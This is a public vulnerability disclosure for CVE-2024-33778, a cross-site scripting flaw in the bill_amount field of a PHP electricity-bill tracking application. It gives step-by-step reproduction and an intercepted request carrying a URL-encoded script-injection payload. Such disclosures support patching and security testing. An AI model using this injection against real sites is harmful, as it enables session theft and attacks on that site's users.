# Electricity Consumption Monitoring Tool - Cross-Site-Scripting -1
+ *Exploit Title:* Electricity Consumption Monitoring Tool  - Cross-Site-Scripting -1 - Parameter bill_amount
+ *Date:* 2024-04-24
+ *Exploit Author:* Asif Nawaz Minhas
+ *Vendor Homepage:* https://www.sourcecodester.com/php/17328/electricity-consumption-monitoring-tool-using-php-and-mysql-source-code.html
+ *Software Link:* https://download.code-projects.org/details/97b61777-5089-4b4f-841f-10e10be5859e
+ *Version:* 1.0
+ *Tested on:* Kali Linux + PHP 8.2.12, Apache 2.4.58
+ *CVE:* CVE-2024-33778

## Description:
Electricity Consumption Monitoring Tool is vulnerable to a cross-site scripting vulnerability because it fails to adequately sanitize user-supplied data. 
An attacker could exploit this issue to run arbitrary scripting code in an unsuspecting user's browser in the context of the affected site. 
This could allow an attacker to steal cookie-based authentication credentials and launch other attacks.

## Proof of Concept:
+ Go to http://localhost/electricity-comsumption-monitoring/
+ Click on Add Electricity Bill
+ Fill in normal dates like 10/10/1010 and in Bill Amount Fill in 10
+ Click on Add
+ Intercept this request
+ The parameters should be as followed: 

bill_date=1010-10-10&bill_amount=oeq80%3cscript%3ealert(1)%3c%2fscript%3ejpks9

Electricity Consumption Monitoring Tool/elec xss 1.png


+ Then Forwared the request
+ XSS will be triggered.

 ![XSS_1](  https://github.com/ethicalhackerNL/CVEs/blob/e6302b61ab35762dc970746e4fbbb7641f7510c0/Electricity%20Consumption%20Monitoring%20Tool/elec%20xss%201.png
)



